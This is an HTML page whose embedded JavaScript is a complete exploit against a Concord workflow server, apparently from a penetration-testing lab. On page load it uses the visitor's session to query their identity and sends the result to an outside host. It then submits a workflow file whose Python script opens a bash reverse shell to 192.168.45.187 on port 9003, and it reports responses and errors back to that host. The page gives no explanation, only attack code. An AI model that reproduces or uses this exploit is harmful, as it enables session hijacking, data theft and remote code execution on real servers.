<html>
<head>
<script>
yml = `
configuration:
  dependencies:
  - "mvn://org.python:jython-standalone:2.7.2"

flows:
  default:
  - script: python
    body: |
      cmd = "/bin/bash -i >& /dev/tcp/192.168.45.187/9003 0>&1"
      import subprocess
      subprocess.call(cmd, shell=True)
`
console.log(yml)

fetch("http://concord:8001/api/service/console/whoami", {
	credentials: 'include'
})
.then(async (response) => {
	if(response.status != 401){
		let data = await response.text();
		fetch("http://192.168.45.187/?msg=" + data );
		rce();
	}else{
		fetch("http://192.168.45.187/?msg=UserNotLoggedIn" )
		rce();
	}
})

rce = () => {
	var ymlBlob = new Blob([yml], {type: "application/yml"});
	var fd = new FormData();
	fd.append('concord.yml', ymlBlob);
	fetch("http://concord:8001/api/v1/process", {
		credentials: "include",
		method: "POST",
		body: fd
	}).then (response => response.text())
	.then(data => {
		fetch("http://192.168.45.187/?msg=" + data);
	}).catch(err => {
		fetch("http://192.168.45.187/?err=" + err);
	});
}
</script>
</head>
 
<body>
</body>
</html>
